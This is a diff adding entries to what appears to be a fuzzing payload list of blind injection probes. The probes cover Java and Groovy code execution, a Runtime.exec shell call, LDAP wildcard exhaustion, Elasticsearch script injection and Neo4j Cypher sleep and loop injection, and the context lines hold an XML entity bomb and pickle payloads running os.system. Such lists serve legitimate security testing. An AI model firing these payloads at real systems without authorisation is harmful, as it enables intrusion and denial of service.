@@ -178,6 +178,8 @@ Kernel.sleep(5)
 99999999.times{1+1}
 Start-Sleep -Seconds 5
 [System.Threading.Thread]::Sleep(5000)
+Thread.sleep(5000)
+new GroovyShell().evaluate('Thread.sleep(5000)')
 <?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "1337"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>
 http://10.255.255.1/
 http://192.0.2.1/
@@ -203,6 +205,19 @@ http://10.255.255.1:9999/timeout
 [$where]=sleep(5000)
 #{T(java.lang.Thread).sleep(5000)}
 %{@java.lang.Thread@sleep(5000)}
+Runtime.getRuntime().exec("sleep 5")
+*)(|(cn=*a*b*c*d*e*f*g*h*i*j*k*l*m*n*o*p*q*r*s*t*u*v*w*x*y*z*
+*)(|(cn=*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*
+*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*)(cn=*
+*)(|(sn=*a*b*c*)(cn=*d*e*f*)(uid=*g*h*i*)(mail=*j*k*l*)(description=*m*n*o*
+{"query":{"script":{"script":{"source":"Thread.sleep(5000); return true"}}}}
+{"script_fields":{"x":{"script":"Thread.sleep(5000); return 1"}}}
+{"script_fields":{"x":{"script":{"source":"long t=System.currentTimeMillis();while(System.currentTimeMillis()-t<5000){} return 1"}}}}
+{"query":{"regexp":{"name":".*.*.*.*.*.*.*.*.*.*a"}}}
+' OR 1=1 WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
+') WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
+' WITH 1 AS x UNWIND range(1,10000000) AS y RETURN count(y) //
+') WITH 1 AS x UNWIND range(1,10000000) AS y RETURN count(y) //
 Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
 gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA1cQGFcQJScQMu
 gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu
